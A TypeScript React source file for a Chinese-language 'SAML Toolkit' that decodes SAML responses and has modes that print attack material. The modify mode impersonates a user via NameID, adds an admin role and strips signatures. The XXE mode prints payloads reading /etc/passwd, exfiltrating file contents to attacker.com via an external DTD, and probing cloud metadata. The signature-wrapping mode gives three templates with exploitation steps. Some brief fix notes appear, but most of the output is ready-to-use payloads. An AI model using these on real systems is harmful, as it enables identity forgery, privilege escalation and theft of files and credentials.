import SimpleTool from '../../_shared/SimpleTool';
import type { ToolProps } from '../../types';

/* ============================================================
 * SAML Toolkit
 * Decode / modify / XXE / signature-wrapping for SAML responses.
 * ========================================================== */

const decodeBase64 = (input: string): string => {
  const s = input.trim().replace(/\s/g, '');
  try {
    // Handle URL-safe base64
    const normalized = s.replace(/-/g, '+').replace(/_/g, '/');
    const decoded = atob(normalized);
    return decoded;
  } catch {
    // Might be raw XML
    return input;
  }
};

const formatXml = (xml: string): string => {
  // Simple XML formatter
  let formatted = '';
  let indent = '';
  const tab = '  ';
  xml.split(/>\s*</).forEach((node) => {
    if (node.startsWith('/') || node.startsWith('?')) {
      indent = indent.substring(0, indent.length - tab.length);
    }
    formatted += indent + '<' + node + '>\n';
    if (
      node.charAt(0) !== '/' &&
      !node.startsWith('?') &&
      !node.endsWith('/') &&
      !node.startsWith('!--') &&
      !node.includes('</') &&
      !node.startsWith('![CDATA')
    ) {
      indent += tab;
    }
    if (node.startsWith('/')) {
      indent = indent.substring(0, indent.length - tab.length);
    }
  });
  return formatted.trim();
};

const decodeSaml = (input: string): string => {
  const xml = decodeBase64(input);
  const formatted = formatXml(xml);
  const lines: string[] = [];
  lines.push('── SAML Response 解码 ──');
  lines.push('');
  lines.push(' ▸ 原始 XML (格式化):');
  lines.push('');
  formatted.split('\n').forEach((l) => lines.push(`   ${l}`));
  lines.push('');

  // Extract key fields
  lines.push(' ▸ 关键信息提取:');
  const assertions: string[] = [];
  const conditions: string[] = [];
  const nameIds: string[] = [];
  const attrs: string[] = [];

  // Simple regex extraction
  const nameIdMatch = xml.match(/<saml:NameID[^>]*>(.*?)<\/saml:NameID>/);
  if (nameIdMatch) {
    nameIds.push(`NameID: ${nameIdMatch[1]}`);
  }
  const nameIdMatch2 = xml.match(/<NameID[^>]*>(.*?)<\/NameID>/);
  if (nameIdMatch2) {
    nameIds.push(`NameID: ${nameIdMatch2[1]}`);
  }

  const notBefore = xml.match(/NotBefore="([^"]*)"/);
  const notOnOrAfter = xml.match(/NotOnOrAfter="([^"]*)"/);
  if (notBefore) conditions.push(`NotBefore: ${notBefore[1]}`);
  if (notOnOrAfter) conditions.push(`NotOnOrAfter: ${notOnOrAfter[1]}`);

  const issuer = xml.match(/<saml:Issuer[^>]*>(.*?)<\/saml:Issuer>/) || xml.match(/<Issuer[^>]*>(.*?)<\/Issuer>/);
  if (issuer) conditions.push(`Issuer: ${issuer[1]}`);

  const audience = xml.match(/<saml:Audience[^>]*>(.*?)<\/saml:Audience>/) || xml.match(/<Audience[^>]*>(.*?)<\/Audience>/);
  if (audience) conditions.push(`Audience: ${audience[1]}`);

  // Extract attributes
  const attrRegex = /<saml:Attribute[^>]*Name="([^"]*)"[^>]*>([\s\S]*?)<\/saml:Attribute>/g;
  let attrMatch;
  while ((attrMatch = attrRegex.exec(xml)) !== null) {
    const name = attrMatch[1];
    const valueMatch = attrMatch[2].match(/<saml:AttributeValue[^>]*>(.*?)<\/saml:AttributeValue>/);
    attrs.push(`${name}: ${valueMatch ? valueMatch[1] : '(empty)'}`);
  }

  for (const n of nameIds) lines.push(`   ${n}`);
  for (const c of conditions) lines.push(`   ${c}`);
  for (const a of attrs) lines.push(`   ${a}`);

  if (nameIds.length === 0) lines.push('   NameID: (未找到)');
  if (conditions.length === 0) lines.push('   Conditions: (未找到)');
  if (attrs.length === 0) lines.push('   Attributes: (未找到)');

  lines.push('');
  lines.push(' 说明:');
  lines.push('  - SAML Response 通常是 Base64 编码的 XML');
  lines.push('  - NameID 是用户标识, Conditions 包含时间限制');
  lines.push('  - Attributes 包含用户属性 (角色/邮箱等)');
  return lines.join('\n');
};

const modifySaml = (input: string): string => {
  let xml = decodeBase64(input);
  const lines: string[] = [];
  lines.push('── SAML Response 修改 ──');
  lines.push('');
  lines.push(' ▸ 1. 修改 NameID (身份冒用):');
  lines.push('   # 将 NameID 值替换为目标用户:');
  lines.push('   <saml:NameID>attacker@evil.com</saml:NameID>');
  lines.push('   # 原 NameID 可能是 victim@target.com');
  lines.push('');
  lines.push(' ▸ 2. 修改 NotOnOrAfter (延长会话):');
  lines.push('   # 将过期时间延后:');
  lines.push('   NotOnOrAfter="2099-12-31T23:59:59Z"');
  lines.push('   # 原值可能是 2024-01-01T12:00:00Z');
  lines.push('');
  lines.push(' ▸ 3. 添加管理员属性:');
  lines.push('   <saml:Attribute Name="role">');
  lines.push('     <saml:AttributeValue>admin</saml:AttributeValue>');
  lines.push('   </saml:Attribute>');
  lines.push('');
  lines.push(' ▸ 4. 修改 Audience:');
  lines.push('   <saml:Audience>https://target.com</saml:Audience>');
  lines.push('');
  lines.push(' ▸ 5. 删除签名 (如果验证不严格):');
  lines.push('   # 移除 <ds:Signature> 整个节点');
  lines.push('   # 或将 SignatureValue 替换为空');
  lines.push('');

  // Show modified XML with NameID change
  const modified = xml.replace(
    /(<saml:NameID[^>]*>)[^<]*(<\/saml:NameID>)/,
    '$1attacker@evil.com$2',
  ).replace(
    /(<NameID[^>]*>)[^<]*(<\/NameID>)/,
    '$1attacker@evil.com$2',
  );

  lines.push(' ▸ 修改后的 XML (NameID 已替换):');
  lines.push('');
  const formatted = formatXml(modified);
  formatted.split('\n').forEach((l) => lines.push(`   ${l}`));
  lines.push('');
  lines.push(' 说明:');
  lines.push('  - 修改后需要重新 Base64 编码:');
  lines.push('    echo -n "<modified_xml>" | base64 -w0');
  lines.push('  - 如果 SP 验证签名, 修改后签名不匹配, 需配合签名包装攻击');
  lines.push('  - 某些实现不验证签名或验证不完整, 可直接修改');
  return lines.join('\n');
};

const xxeSaml = (): string => {
  const lines: string[] = [];
  lines.push('── SAML XXE 注入 ──');
  lines.push('');
  lines.push(' ▸ XXE payload (读取 /etc/passwd):');
  lines.push('');
  lines.push('   <?xml version="1.0" encoding="UTF-8"?>');
  lines.push('   <!DOCTYPE foo [');
  lines.push('     <!ENTITY xxe SYSTEM "file:///etc/passwd">');
  lines.push('   ]>');
  lines.push('   <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">');
  lines.push('     <saml:Issuer>&xxe;</saml:Issuer>');
  lines.push('     ...');
  lines.push('   </samlp:Response>');
  lines.push('');
  lines.push(' ▸ OOB XXE (外带数据, 适用于无回显):');
  lines.push('');
  lines.push('   <?xml version="1.0" encoding="UTF-8"?>');
  lines.push('   <!DOCTYPE foo [');
  lines.push('     <!ENTITY % file SYSTEM "file:///etc/passwd">');
  lines.push('     <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">');
  lines.push('     %dtd;');
  lines.push('   ]>');
  lines.push('   <samlp:Response ...>');
  lines.push('     <saml:Issuer>&send;</saml:Issuer>');
  lines.push('   </samlp:Response>');
  lines.push('');
  lines.push('   # attacker.com/evil.dtd 内容:');
  lines.push('   <!ENTITY % all "<!ENTITY send SYSTEM \'http://attacker.com/?data=%file;\'>">');
  lines.push('   %all;');
  lines.push('');
  lines.push(' ▸ SSRF via XXE:');
  lines.push('   <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">');
  lines.push('   <saml:Issuer>&xxe;</saml:Issuer>');
  lines.push('');
  lines.push(' ▸ Base64 编码后发送:');
  lines.push('   # 将 XXE XML Base64 编码, 替换 SAMLResponse 参数:');
  lines.push('   echo -n "<xxe_xml>" | base64 -w0');
  lines.push('   # 提交: POST /saml/consume SAMLResponse=<base64>');
  lines.push('');
  lines.push(' 说明:');
  lines.push('  - SAML 基于 XML, 如果 XML 解析器未禁用外部实体则可 XXE');
  lines.push('  - OOB XXE 用于无回显场景, 数据通过 DNS/HTTP 外带');
  lines.push('  - 可利用 XXE 读取本地文件、SSRF、端口扫描');
  lines.push('  - 修复: 禁用 DTD、外部实体和外部 DTD 引用');
  return lines.join('\n');
};

const signatureWrapping = (): string => {
  const lines: string[] = [];
  lines.push('── SAML 签名包装攻击 ──');
  lines.push('');
  lines.push(' ▸ 攻击原理:');
  lines.push('  - SP 验证签名时只检查签名是否有效');
  lines.push('  - 但实际使用的是另一个未被签名的 Assertion');
  lines.push('  - 攻击者插入恶意 Assertion, 保留原始签名');
  lines.push('');
  lines.push(' ▸ 攻击模板 1 (插入恶意 Assertion):');
  lines.push('');
  lines.push('   <samlp:Response ...>');
  lines.push('     <saml:Issuer>https://idp.com</saml:Issuer>');
  lines.push('     <!-- 原始签名 Assertion (保持完整) -->');
  lines.push('     <ds:Signature>...');
  lines.push('     <saml:Assertion ID="original">');
  lines.push('       <saml:Subject>victim@target.com</saml:Subject>');
  lines.push('     </saml:Assertion>');
  lines.push('     <!-- 攻击者插入的恶意 Assertion (未签名) -->');
  lines.push('     <saml:Assertion ID="evil">');
  lines.push('       <saml:Subject>admin@target.com</saml:Subject>');
  lines.push('       <saml:AttributeStatement>');
  lines.push('         <saml:Attribute Name="role">');
  lines.push('           <saml:AttributeValue>admin</saml:AttributeValue>');
  lines.push('         </saml:Attribute>');
  lines.push('       </saml:AttributeStatement>');
  lines.push('     </saml:Assertion>');
  lines.push('   </samlp:Response>');
  lines.push('');
  lines.push(' ▸ 攻击模板 2 (签名包含在 Response 外层):');
  lines.push('');
  lines.push('   <samlp:Response ...>');
  lines.push('     <ds:Signature>');
  lines.push('       <!-- 原始 Response 签名 -->');
  lines.push('     </ds:Signature>');
  lines.push('     <!-- 修改后的 Assertion -->');
  lines.push('     <saml:Assertion>');
  lines.push('       <saml:Subject>admin@target.com</saml:Subject>');
  lines.push('     </saml:Assertion>');
  lines.push('   </samlp:Response>');
  lines.push('');
  lines.push(' ▸ 攻击模板 3 (XML 注释混淆):');
  lines.push('');
  lines.push('   <samlp:Response>');
  lines.push('     <saml:Assertion ID="signed">');
  lines.push('       <!-- 原始被签名的内容 -->');
  lines.push('       <saml:Subject>victim@target.com</saml:Subject>');
  lines.push('     </saml:Assertion>');
  lines.push('     <saml:Assertion ID="evil">');
  lines.push('       <saml:Subject>admin@target.com</saml:Subject>');
  lines.push('       <!-- 攻击者内容 -->');
  lines.push('     </saml:Assertion>');
  lines.push('     <!-- 签名引用 ID="signed", 但 SP 可能使用最后一个 Assertion -->');
  lines.push('   </samlp:Response>');
  lines.push('');
  lines.push(' ▸ 利用步骤:');
  lines.push('   1. 获取一个合法的 SAML Response (合法用户登录)');
  lines.push('   2. 保留签名和被签名的 Assertion');
  lines.push('   3. 添加恶意 Assertion (修改 NameID/角色)');
  lines.push('   4. Base64 编码后提交给 SP');
  lines.push('   5. SP 验证签名通过, 但使用恶意 Assertion');
  lines.push('');
  lines.push(' 说明:');
  lines.push('  - 根因: SP 验证签名和使用断言使用了不同节点');
  lines.push('  - 修复: 验证 Assertion 的签名引用 ID, 确保使用的 Assertion 被签名');
  lines.push('  - CVE-2017-11427 (OneLogin) 等多个库受此问题影响');
  return lines.join('\n');
};

const ToolComponent = (props: ToolProps) => (
  <SimpleTool
    {...props}
    toolName="SAML工具"
    paramsConfig={[
      {
        name: 'mode',
        label: '模式',
        type: 'select',
        default: 'decode',
        options: [
          { value: 'decode', label: '解码' },
          { value: 'modify', label: '修改' },
          { value: 'xxe', label: 'XXE注入' },
          { value: 'signature-wrapping', label: '签名包装' },
        ],
      },
    ]}
    execute={(input: string, _mode: string, params: Record<string, unknown>): string => {
      const mode = (params.mode as string) ?? 'decode';
      switch (mode) {
        case 'decode':
          return decodeSaml(input);
        case 'modify':
          return modifySaml(input);
        case 'xxe':
          return xxeSaml();
        case 'signature-wrapping':
          return signatureWrapping();
        default:
          return decodeSaml(input);
      }
    }}
  />
);
export default ToolComponent;
